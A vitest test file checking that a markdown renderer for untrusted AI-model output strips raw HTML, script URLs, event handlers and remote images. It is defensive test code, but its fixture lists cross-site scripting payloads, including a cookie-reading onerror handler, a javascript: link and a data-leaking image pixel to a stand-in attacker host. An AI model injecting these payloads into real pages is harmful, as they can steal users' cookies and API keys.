import { describe, it, expect } from "vitest";
import { renderMarkdownUntrusted } from "../markdown.js";

// The AI review renders text from a third-party model, and the page holds the user's API
// key in localStorage. Whatever the model returns must not be able to run script.
describe("renderMarkdownUntrusted", () => {
  const evil = [
    'Hello <img src=x onerror="alert(document.cookie)"> world',
    "[click me](javascript:alert(1))",
    "![pixel](https://evil.example/p.png?k=1)",
    "<script>steal()</script>",
    "<b onmouseover=x>bold</b>",
  ].join("\n\n");

  it("neutralizes raw HTML, script URLs and remote images", () => {
    const html = renderMarkdownUntrusted(evil);
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<b\b/i);
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/<[^>]+\son\w+=/i); // no live event-handler attribute on any tag
    expect(html).toContain("click me"); // the link text survives, just not as a link
  });

  it("still renders normal markdown and safe links", () => {
    const html = renderMarkdownUntrusted("## Verdict\n\nSolid **design**. See [docs](https://example.com/x) and `code`.");
    expect(html).toContain("<h2");
    expect(html).toContain("<strong>design</strong>");
    expect(html).toContain('href="https://example.com/x"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain("<code>code</code>");
  });
});
